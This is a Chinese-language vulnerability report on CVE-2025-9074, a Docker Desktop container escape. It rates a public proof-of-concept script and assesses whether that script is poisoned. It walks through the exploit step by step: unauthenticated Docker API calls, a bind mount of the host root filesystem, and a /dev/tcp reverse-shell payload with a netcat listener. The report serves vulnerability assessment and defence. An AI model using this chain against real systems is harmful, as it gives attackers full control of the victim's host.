## CVE-2025-9074 - Docker Desktop 容器逃逸/本地权限提升

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/本地权限提升

**影响应用:** Docker Desktop

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows and macOS prior to 4.44.3

**利用条件:** 本地恶意容器运行；对Docker Engine API未认证访问（默认子网192.168.65.7:2375）

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析: 提供的POC脚本`CVE-2025-9074.sh`是验证和利用CVE-2025-9074漏洞的直接且高效工具。该漏洞允许恶意容器绕过Docker Desktop在Windows和macOS上的隔离机制，通过默认子网（192.168.65.7:2375）访问未认证的Docker Engine API。脚本利用`curl`与暴露的Docker Engine API交互。它首先查询`/images/json`获取可用镜像。随后，精心构造JSON负载，通过`POST`请求发送至`/containers/create`。此负载包含关键配置：`Image`使用已获取镜像；`Cmd`执行反向shell命令（`bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1`）；最重要的是，`HostConfig.Binds`将宿主机根文件系统（Windows: `/mnt/host/c:/host_root_win`, macOS/Linux: `/:/host_root_nix`）挂载到新容器。这意味着攻击者不仅获得容器内代码执行，还能直接访问宿主机文件系统。最后，脚本通过`/containers/{ID}/start`启动容器，触发反向shell连接。脚本清晰地提供了参数说明和`bash`/`curl`依赖项，使其易于使用。该POC简洁高效地证明了漏洞的存在及其导致完全宿主机控制的严重后果。

利用步骤:
1.  **环境准备**: 攻击者需能在运行脆弱Docker Desktop版本（Windows/macOS，低于4.44.3）的系统上运行恶意Linux容器。
2.  **监听器设置**: 攻击者在其远程主机（`LHOST`）上启动一个Netcat监听器（`nc -lvnp <LPORT>`），以接收反向shell连接。
3.  **POC执行**: 在恶意容器内部，执行`CVE-2025-9074.sh`脚本，并提供正确的Docker Engine API地址（如`192.168.65.7 2375`）及监听器地址（如`10.10.14.73 9002`）。完整命令示例：`sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
4.  **API交互**: 脚本首先向`http://192.168.65.7:2375/images/json`发送`GET`请求，获取可用Docker镜像列表。
5.  **容器创建**: 脚本随后向`http://192.168.65.7:2375/containers/create`发送`POST`请求，请求体为JSON负载，指定新容器的配置，包括使用的镜像、反向shell命令，以及最关键的——将宿主机根目录挂载到容器内部的绑定配置。
6.  **容器启动**: 获取新创建容器的ID后，脚本再向`http://192.168.65.7:2375/containers/{ID}/start`发送`POST`请求，启动该容器。
7.  **宿主机控制**: 容器启动后，其内部执行的反向shell将连接到攻击者监听器，授予宿主机shell访问权限。由于宿主机文件系统已挂载，攻击者可直接通过容器访问和修改宿主机文件，实现完全控制。

投毒风险分析: 针对GitHub上提供的`CVE-2025-9074.sh` POC代码进行全面审计，评估其投毒风险为低，具体百分比为10%。此评估基于对代码透明度、依赖性、行为模式以及与典型恶意软件特征对比的深入分析。
首先，该POC是一个纯粹的shell脚本，具有极高的可读性和透明度。代码内容未经任何形式的代码混淆处理（如Base64编码、XOR加密、自定义编码或二进制打包），这使得任何审查者都能直接理解其每一行代码的功能和意图。这种透明性是评估低投毒风险的关键因素，因为它从根本上排除了在代码中隐藏额外恶意逻辑的可能性，用户无需担心无法识别隐藏的恶意行为。
其次，脚本的外部依赖性极低且均为标准组件。它仅依赖于`bash`（作为执行环境）和`curl`（用于HTTP通信），这两者都是现代Linux系统和容器环境中普遍存在的标准、可信工具。脚本没有尝试下载、安装或调用任何非标准库、第三方二进制文件、编译器或通过包管理器（如`pip`, `npm`, `apt`, `yum`）引入潜在的恶意包。这种对标准工具的严格依赖，极大地降低了通过供应链攻击或引入未知恶意代码的风险，确保了执行环境的纯净。
第三，脚本的行为模式完全符合其声明的漏洞利用目的。它的核心功能是发现一个Docker镜像，然后利用Docker Engine API的未授权访问特性，创建一个带有反向shell载荷并挂载宿主机文件系统的新容器。这个过程是典型的本地权限提升和容器逃逸利用链。脚本未包含任何超出此范围的附加恶意行为。例如，它没有尝试：
*   **持久化机制**: 脚本本身不向宿主机写入任何启动项、服务文件、计划任务或修改关键配置文件以建立持久化后门。反向shell的连接是暂时的，一旦容器停止或连接中断，攻击者的直接访问就会终止。
*   **数据窃取/外传**: 除了建立反向shell连接，脚本本身不执行任何扫描敏感文件、收集系统信息并将其传输到攻击者C2服务器的操作。虽然获得shell后攻击者可以手动执行这些操作，但这已超出POC脚本本身的范围。
*   **资源滥用**: 脚本中没有发现任何比特币挖矿、僵尸网络构建、DDoS攻击组件或系统资源（如CPU、内存）滥用的代码。
*   **干扰安全防御**: 脚本不包含禁用防火墙、卸载安全软件或修改SELinux/AppArmor策略等旨在逃避检测或对抗防御措施的代码。
第四，与常见的“投毒”POC对比，此脚本缺乏典型的恶意载荷特征。高投毒风险的POC通常会：在执行漏洞利用的同时，静默安装后门程序、修改系统引导项、植入勒索软件、注册恶意服务、利用漏洞下载并执行第二阶段的恶意Payload，或者将系统敏感数据偷偷发送至攻击者的服务器。而`CVE-2025-9074.sh`脚本仅专注于利用漏洞本身以获取宿主机shell，不夹带任何“私货”。这意味着其主要安全风险在于漏洞利用本身带来的宿主机控制，而非POC代码中隐藏的次级恶意载荷。因此，将其投毒风险评定为低风险是合理且准确的。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
